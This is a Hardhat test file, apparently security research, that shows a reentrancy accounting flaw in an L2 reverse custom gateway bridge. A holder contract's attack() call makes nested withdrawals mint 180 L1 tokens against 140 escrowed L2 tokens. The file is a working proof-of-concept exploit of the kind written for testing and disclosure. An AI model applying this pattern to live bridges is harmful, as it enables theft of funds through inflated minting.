/* eslint-env node, mocha */
import { ethers, network } from 'hardhat'
import { expect } from 'chai'

import { processL1ToL2Tx, processL2ToL1Tx } from './testhelper'

describe('Research: L2 reverse custom gateway nested withdrawal accounting', () => {
  it('mints more L1 representation than the L2 tokens escrowed', async () => {
    const [deployer, recipient] = await ethers.getSigners()

    const InboxMock = await ethers.getContractFactory('InboxMock')
    const inbox = await InboxMock.deploy()

    const L1Router = await ethers.getContractFactory('L1GatewayRouter')
    const l1Router = await L1Router.deploy()
    const L1Gateway = await ethers.getContractFactory('L1ReverseCustomGateway')
    const l1Gateway = await L1Gateway.deploy()

    const L2Gateway = await ethers.getContractFactory('L2ReverseCustomGateway')
    const l2Gateway = await L2Gateway.deploy()
    const L2Router = await ethers.getContractFactory('L2GatewayRouter')
    const l2Router = await L2Router.deploy()

    await l1Gateway.initialize(
      l2Gateway.address,
      l1Router.address,
      inbox.address,
      deployer.address
    )
    await l2Gateway.initialize(l1Gateway.address, l2Router.address)
    await l1Router.initialize(
      deployer.address,
      ethers.constants.AddressZero,
      ethers.constants.AddressZero,
      l2Router.address,
      inbox.address
    )
    await l2Router.initialize(l1Router.address, l2Gateway.address)

    const ArbSysMock = await ethers.getContractFactory('ArbSysMock')
    const arbSysMock = await ArbSysMock.deploy()
    await network.provider.send('hardhat_setCode', [
      '0x0000000000000000000000000000000000000064',
      await network.provider.send('eth_getCode', [arbSysMock.address]),
    ])

    const L1Token = await ethers.getContractFactory(
      'ReverseTestCustomTokenL1'
    )
    const l1Token = await L1Token.deploy(l1Gateway.address, l1Router.address)

    const L2Token = await ethers.getContractFactory('ReentrantReverseToken')
    const l2Token = await L2Token.deploy(l1Token.address)

    await processL1ToL2Tx(
      await l1Token.registerTokenOnL2(
        l2Token.address,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        deployer.address
      )
    )

    const Holder = await ethers.getContractFactory(
      'ReverseGatewayReentrantHolder'
    )
    const holder = await Holder.deploy(
      l2Router.address,
      l2Gateway.address,
      l2Token.address,
      l1Token.address
    )

    const outerAmount = ethers.BigNumber.from(100)
    const nestedAmount = ethers.BigNumber.from(40)
    const actualEscrow = outerAmount.add(nestedAmount)
    const encodedWithdrawal = outerAmount.add(nestedAmount.mul(2))

    await l2Token.mint(holder.address, actualEscrow)

    const tx = await holder.attack(
      recipient.address,
      outerAmount,
      nestedAmount
    )
    const receipt = await tx.wait()

    const gatewayEvents = receipt.logs
      .filter(log => log.address === l2Gateway.address)
      .map(log => l2Gateway.interface.parseLog(log))
      .filter(event => event.name === 'WithdrawalInitiated')

    expect(gatewayEvents).to.have.length(2)
    const withdrawalAmounts = gatewayEvents.map(event => event.args._amount)
    expect(withdrawalAmounts[0]).to.equal(nestedAmount)
    expect(withdrawalAmounts[1]).to.equal(outerAmount.add(nestedAmount))

    expect(await l2Token.balanceOf(l2Gateway.address)).to.equal(actualEscrow)
    expect(
      withdrawalAmounts[0].add(withdrawalAmounts[1])
    ).to.equal(encodedWithdrawal)

    await processL2ToL1Tx(tx, inbox)
    expect(await l1Token.balanceOf(recipient.address)).to.equal(
      encodedWithdrawal
    )
  })
})
